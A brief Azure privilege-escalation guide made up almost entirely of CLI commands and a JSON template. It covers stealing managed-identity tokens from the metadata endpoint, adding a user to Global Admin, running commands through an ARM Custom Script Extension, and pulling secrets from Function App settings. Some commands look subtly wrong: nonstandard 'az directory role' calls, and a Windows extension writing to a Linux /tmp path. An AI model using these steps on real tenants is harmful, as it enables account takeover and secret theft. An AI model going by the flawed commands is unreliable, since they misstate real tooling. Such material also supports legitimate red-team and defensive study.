# Azure Privilege Escalation Guide

## Introduction

Azure privilege escalation exploits misconfigurations in Azure AD roles, Managed Identities, and resource permissions to gain elevated access. This guide covers the most common escalation paths with practical Azure CLI commands.

## Practical Steps

### 1. Reconnaissance

```bash
# Enumerate current permissions
az ad signed-in-user show
az role assignment list --assignee $(az ad signed-in-user show --query objectId -o tsv)
az keyvault list
az vm list --output table
```

### 2. Managed Identity Abuse

```bash
# Check if VM has managed identity
az vm identity show --resource-group rg-target --name vm-target

# Extract token from IMDS
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use token to access Azure resources
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/{sub-id}/resourceGroups?api-version=2021-04-01"
```

### 3. Azure AD Role Escalation

```bash
# List assignable roles
az role definition list --custom-role-only false
# Check for Privileged Role Administrator
az directory role list --query "[?displayName=='Privileged Role Administrator']"
# Add user to Global Admin role (if permissions allow)
az directory role member add --role-id <role-id> --member-id <user-id>
```

### 4. ARM Template Injection

```json
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [{
    "type": "Microsoft.Compute/virtualMachines/extensions",
    "name": "vm-target/custom-script",
    "apiVersion": "2021-07-01",
    "properties": {
      "publisher": "Microsoft.Compute",
      "type": "CustomScriptExtension",
      "typeHandlerVersion": "1.10",
      "settings": {"commandToExecute": "whoami > /tmp/pwned.txt"}
    }
  }]
}
```

### 5. Function App Vulnerabilities

```bash
# List function apps
az functionapp list --output table
# Extract app settings (may contain secrets)
az functionapp config appsettings list --name func-target --resource-group rg-target
```

## References

- [Azure AD Attack Paths (Skyport)](https://skyport.io/blog/azure-ad-attack-paths/)
- [Microsoft Azure Security Benchmark](https://learn.microsoft.com/en-us/security/benchmark/azure/)
- [ROADtools - Azure AD Object Hydration](https://github.com/dirkjanm/ROADtools)
- [Stormspotter - Azure AD Attack Graph](https://github.com/Azure/Stormspotter)
